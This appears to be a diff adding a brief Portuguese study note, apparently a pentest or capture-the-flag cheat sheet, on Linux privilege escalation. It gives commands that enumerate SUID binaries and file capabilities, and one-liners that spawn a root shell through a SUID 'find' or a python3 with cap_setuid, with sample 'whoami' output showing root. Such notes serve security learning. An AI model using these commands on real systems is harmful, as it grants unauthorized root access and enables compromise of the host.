@@ -1,0 +1,56 @@
+                         ━━━━━━━━━━━━━━━━━━━━━━
+                          SUIDS E CAPABILITIES
+
+                                gabriel
+                         ━━━━━━━━━━━━━━━━━━━━━━
+
+
+Table of Contents
+─────────────────
+
+1. SUID
+2. Capabilities
+
+
+1 SUID
+══════
+
+  É atribuído a um arquivo binário com permissão de execução, quando
+  desejamos que um usuário qualquer execute o comando com as permissões
+  do user owner do comando (Root)
+
+  *buscando por SUIDs no sistema* –>
+  ┌────
+  │ find / -type f -perm -4000 -ls 2>/dev/null
+  └────
+
+  o próprio comando *find* pode ser utilizado para escalada de privs
+  caso possua o SETUID –>
+  ┌────
+  │ find . -exec /bin/sh -p \; -quit
+  │ 
+  │ # whoami
+  │ root
+  └────
+
+
+2 Capabilities
+══════════════
+
+  o programa binário adquire todas as permissões do proprietário
+  (geralmente root) durante a execução. Isso é um risco de segurança,
+  pois um programa comprometido ganha poder total de root.
+
+  *busca por capabilities* –>
+  ┌────
+  │ /usr/sbin/getcap -r / 2>/dev/null
+  └────
+
+  Após encontrar o python3 com a cap_setuid=ep, a escalada de
+  privilégios pode ocorrer da seguinte forma –>
+  ┌────
+  │ /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+  │ 
+  │ # whoami
+  │ root
+  └────
